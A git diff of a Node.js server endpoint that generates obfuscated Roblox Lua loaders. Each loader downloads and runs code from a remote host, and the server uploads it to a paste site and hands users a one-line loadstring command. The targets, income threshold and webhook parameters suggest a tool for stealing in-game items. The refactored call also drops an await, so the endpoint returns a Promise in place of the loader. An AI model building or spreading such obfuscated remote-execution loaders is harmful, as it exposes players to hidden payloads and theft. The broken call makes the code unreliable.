@@ -111,6 +111,38 @@ function generateScriptId() {
     return id;
 }
 
+async function createScriptLoader(minIncome, maxItems, targetsRaw, webhookUrlRaw, visualRaw) {
+    let targetsArray = [];
+    if (Array.isArray(targetsRaw)) targetsArray = targetsRaw.map(t => String(t));
+    else if (typeof targetsRaw === 'string') {
+        targetsArray = targetsRaw.split(',').map(s => s.trim()).filter(s => s.length > 0);
+    }
+
+    const luaTargets = targetsArray.length > 0 ? targetsArray.map(t => `"${t.replace(/"/g, '\\"')}"`).join(', ') : '';
+    const scriptId = generateScriptId();
+
+    // build Lua loader script
+    const src = [
+        `local fenv = getfenv()`,
+        `local var0 = setmetatable({}, {`,
+        `\t["__index"] = {},`,
+        `})`,
+        ``,
+        `fenv["MinIncome"] = ${minIncome}`,
+        `fenv["MaxItems"] = ${maxItems}`,
+        `fenv["Targets"] = { ${luaTargets} }`,
+        `fenv["Visual"] = ${visualRaw === "" ? '""' : '"' + String(visualRaw).replace(/"/g, '\\"') + '"'}`,
+        `fenv["ScriptId"] = "${scriptId}"`,
+        ``,
+        `local var1 = game:HttpGet("https://m4gix-ws.onrender.com/scripts/ts")`,
+        `local var2 = loadstring(var1)`,
+        `local var3 = var2()`
+    ].join('\n');
+        
+    const lua = await obfuscateScript(src);
+    const paste = await uploadScript(lua, `${scriptId}.lua`, 'hfI1y3F8');
+    return `loadstring(game:HttpGet("${paste.raw_url}"))()`;
+}
 // --- CONNEXION DB ---
 mongoose.connect(MONGO_URI)
     .then(() => {
@@ -156,39 +188,9 @@ app.post('/api/create-script', async (req, res) => {
         const webhookUrlRaw = body.webhookurl || '';
         const visualRaw = body.visual || '';
 
-        // normalize targets to array of strings
-        let targetsArray = [];
-        if (Array.isArray(targetsRaw)) targetsArray = targetsRaw.map(t => String(t));
-        else if (typeof targetsRaw === 'string') {
-            targetsArray = targetsRaw.split(',').map(s => s.trim()).filter(s => s.length > 0);
-        }
-
-        const luaTargets = targetsArray.length > 0 ? targetsArray.map(t => `"${t.replace(/"/g, '\\"')}"`).join(', ') : '';
-        const scriptId = generateScriptId();
-
-        // build Lua loader script
-        const src = [
-            `local fenv = getfenv()`,
-            `local var0 = setmetatable({}, {`,
-            `\t["__index"] = {},`,
-            `})`,
-            ``,
-            `fenv["MinIncome"] = ${minIncome}`,
-            `fenv["MaxItems"] = ${maxItems}`,
-            `fenv["Targets"] = { ${luaTargets} }`,
-            `fenv["Visual"] = ${visualRaw === "" ? '""' : '"' + String(visualRaw).replace(/"/g, '\\"') + '"'}`,
-            `fenv["ScriptId"] = "${scriptId}"`,
-            ``,
-            `local var1 = game:HttpGet("https://m4gix-ws.onrender.com/scripts/ts")`,
-            `local var2 = loadstring(var1)`,
-            `local var3 = var2()`
-        ].join('\n');
+        const loader = createScriptLoader(minIncome,maxItems,targetsRaw,webhookUrlRaw,visualRaw);
         
-        const lua = await obfuscateScript(src);
-        const paste = await uploadScript(lua, `${scriptId}.lua`, 'hfI1y3F8');
-        
-        // Ne pas enregistrer en base pour l'instant — juste retourner le script
-        return res.status(201).json({ success: true, data: { Script: `loadstring(game:HttpGet("${paste.raw_url}"))()` } });
+        return res.status(201).json({ success: true, data: { Script: loader } });
     } catch (err) {
         log(`❌ [API] POST /api/create-script error: ${err && err.message ? err.message : err}`);
         return res.status(500).json({ success: false, message: 'Internal server error' });
